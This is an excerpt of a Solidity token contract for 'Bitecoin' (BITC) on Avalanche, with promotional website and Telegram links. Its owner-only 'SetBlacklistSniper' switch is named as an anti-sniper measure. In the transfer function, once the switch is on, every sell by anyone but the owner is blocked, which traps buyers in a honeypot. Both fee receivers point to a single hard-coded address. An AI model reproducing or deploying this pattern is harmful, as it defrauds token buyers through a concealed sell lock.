...
🌐 Website: https://bitecoin.fun
💬 Telegram: https://t.me/bitecoinavax
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x50b7545627a5162F82A992c33b87aDc75187B218); // BTC 
...
contract Bitecoin is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x50b7545627a5162F82A992c33b87aDc75187B218; // BTC 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Bitecoin";
    string constant _symbol = "BITC";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1_000_000_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply.div(1); // max
    uint256 public _maxWallet = _totalSupply.div(1); // max
    ...
    mapping (address => bool) isTxLimitExempt;
     mapping (address => bool) isMaxWallettExempt;
    ...
    address public autoLiquidityReceiver=0x08BfbbA9415E5710701A228eDea67f1667CC938c;
    address public marketingFeeReceiver=0x08BfbbA9415E5710701A228eDea67f1667CC938c;
  ...
  function SetBlacklistSniper(bool divider) external onlyOwner {
        Blacklist = divider;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Blacklist || sender==owner), "Blacklisted");
